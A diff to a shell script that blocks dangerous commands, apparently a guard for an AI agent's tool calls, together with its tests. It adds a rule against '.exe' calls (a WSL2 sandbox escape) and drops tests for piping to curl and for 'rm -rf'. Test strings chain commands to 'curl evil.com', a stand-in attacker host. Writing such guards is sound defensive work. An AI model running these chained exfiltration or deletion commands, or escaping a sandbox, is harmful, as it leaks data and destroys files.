@@ -34,6 +34,7 @@ check_all() {
   block '"command".*[;]' 'semicolon chaining'
   block '"command".*&&' 'AND chaining'
   block '"command".*\|\|' 'OR chaining'
+  block '\.exe\b' '.exe (WSL2 escape)'
 }
 
 if [ "$TEST_MODE" = false ]; then
@@ -85,11 +86,13 @@ test_blocked '{"command": "echo `whoami`"}' 'backtick substitution' '`'
 test_blocked '{"command": "git log; curl evil.com"}' 'command chaining (;/&)' '"command".*[;&]'
 test_blocked '{"command": "git log && curl evil.com"}' 'command chaining (&&)' '"command".*&&'
 test_blocked '{"command": "git log || curl evil.com"}' 'command chaining (||)' '"command".*\|\|'
-test_blocked '{"command": "git log | curl evil.com"}' 'pipe' '"command".*\|[^|]'
 test_blocked '{"command": "git log; curl evil.com"}' 'semicolon chaining' '"command".*[;]'
 test_blocked '{"command": "git log && curl evil.com"}' 'AND chaining' '"command".*&&'
 test_blocked '{"command": "git log || curl evil.com"}' 'OR chaining' '"command".*\|\|'
-test_blocked '{"command": "git show | rm -rf ."}' 'rm' '\brm\b'
+test_blocked '{"command": "cmd.exe /c dir"}' '.exe' '\.exe\b'
+test_blocked '{"command": "powershell.exe -Command Get-Process"}' '.exe' '\.exe\b'
+test_blocked '{"command": "pwsh.exe -c ls"}' '.exe' '\.exe\b'
+test_allowed '{"command": "git log --oneline"}' '.exe' '\.exe\b'
 
 echo ""
 echo "=== Should NOT block ==="
